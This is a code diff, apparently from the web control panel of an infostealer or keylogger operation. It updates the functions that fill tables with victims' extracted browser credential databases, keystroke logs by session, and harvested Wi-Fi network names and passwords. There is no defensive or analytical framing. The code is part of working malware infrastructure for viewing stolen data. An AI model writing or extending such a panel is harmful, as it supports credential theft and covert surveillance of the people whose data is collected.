@@ -607,23 +607,23 @@
             `).join('');
 
                 const cBody = document.getElementById('credsBody');
-                cBody.innerHTML = (data.credentials || []).map(c => {
+                cBody.innerHTML = (data.browser || []).map(c => {
                     const cred = c.data || {};
-                    return `<tr><td>${escape(cred.url || cred.origin || '?')}</td><td>${escape(cred.username || cred.email || '?')}</td><td><code>${escape(cred.password || '?')}</code></td></tr>`;
+                    return `<tr><td>${escape(cred.browser || '?')}</td><td>${escape(cred.file ? 'Base64 DB Extracted' : 'Unknown')}</td><td><code>${escape(cred.size + ' bytes')}</code></td></tr>`;
                 }).join('');
 
                 const kBody = document.getElementById('keylogBody');
-                kBody.innerHTML = (data.keylogs || []).map(k => {
+                kBody.innerHTML = (data.keylog || []).map(k => {
                     const ts = k.timestamp?._seconds ? new Date(k.timestamp._seconds * 1000).toLocaleString() : '';
-                    return `<tr><td><code>${escape(k.session_id?.substring(0, 8) || '?')}</code></td><td>${escape((k.data?.content || k.data || '').substring(0, 60))}...</td><td>${escape(ts)}</td></tr>`;
+                    return `<tr><td><code>${escape(k.sessionId?.substring(0, 8) || '?')}</code></td><td>${escape((k.data || '').substring(0, 60))}...</td><td>${escape(ts)}</td></tr>`;
                 }).join('');
 
                 const wBody = document.getElementById('wifiBody');
                 wBody.innerHTML = (data.wifi || []).map(w => {
                     const ts = w.timestamp?._seconds ? new Date(w.timestamp._seconds * 1000).toLocaleString() : '';
                     const wd = w.data || {};
-                    const ssid = Array.isArray(wd) ? wd.map(x => x.ssid).join(', ') : wd.ssid || '?';
-                    const pass = Array.isArray(wd) ? wd.map(x => x.password).join(', ') : wd.password || '?';
+                    const ssid = Array.isArray(wd.networks) ? wd.networks.map(x => x.ssid).join(', ') : '?';
+                    const pass = Array.isArray(wd.networks) ? wd.networks.map(x => x.password).join(', ') : '?';
                     return `<tr><td>${escape(ssid)}</td><td><code>${escape(pass)}</code></td><td>${escape(ts)}</td></tr>`;
                 }).join('');
 
